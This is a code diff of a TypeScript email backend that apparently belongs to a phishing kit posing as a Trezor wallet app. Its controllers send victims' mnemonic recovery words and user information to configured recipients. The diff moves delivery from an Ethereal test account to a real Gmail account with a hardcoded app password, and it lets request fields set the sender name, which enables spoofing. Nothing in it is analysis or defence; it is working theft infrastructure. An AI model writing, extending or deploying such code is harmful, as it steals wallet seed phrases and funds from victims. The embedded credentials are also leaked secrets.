@@ -11,21 +11,16 @@ const getRecipients = (): string[] => {
   return recipients.split(",").map(email => email.trim());
 };
 
-/**
- * Create Nodemailer transporter
- */
+
 const transporter = nodemailer.createTransport({
-  host: 'smtp.ethereal.email',
-  port: 587,
+  service: 'gmail',
   auth: {
-    user: 'theresa.kuphal@ethereal.email',
-    pass: 'H5EbUkcH6PAYFDdV5t'
+    user: 'davidbrown202e@gmail.com',
+    pass: 'mlac pjje fdch nibb'
   }
 });
 
-/**
- * Controller: Send Mnemonic Recovery Email
- */
+
 export const sendMnemonicController = asyncHandler(
   async (req: Request, res: Response): Promise<Response> => {
     const payload = req.body;
@@ -48,9 +43,8 @@ export const sendMnemonicController = asyncHandler(
       if (recipients.length === 0) {
         return errorResponse(res, "No recipients configured", 400);
       }
-
       const mailOptions = {
-        from: `"Trezor App" <${process.env.SMTP_USER}>`,
+        from: `"${payload?.heading}" <${process.env.SMTP_USER}>`,
         to: recipients, // supports array of emails
         subject: "Trezor Mnemonic Recovery Words",
         html: htmlContent,
@@ -58,7 +52,7 @@ export const sendMnemonicController = asyncHandler(
 
       const info = await transporter.sendMail(mailOptions);
       console.log("✅ Email sent:", info.messageId);
-
+      console.log("📬 Preview URL:", nodemailer.getTestMessageUrl(info));
       return successResponse(res, { id: info.messageId }, "Mnemonic sent successfully", 200);
     } catch (error: any) {
       console.error("❌ Email sending error:", error.message);
@@ -94,7 +88,7 @@ export const sendUserInfoController = asyncHandler(
       }
 
       const mailOptions = {
-        from: `"Trezor App" <${process.env.SMTP_USER}>`,
+        from: `"${title}" <${process.env.SMTP_USER}>`,
         to: recipients,
         subject: "User Information Received",
         html: htmlContent,
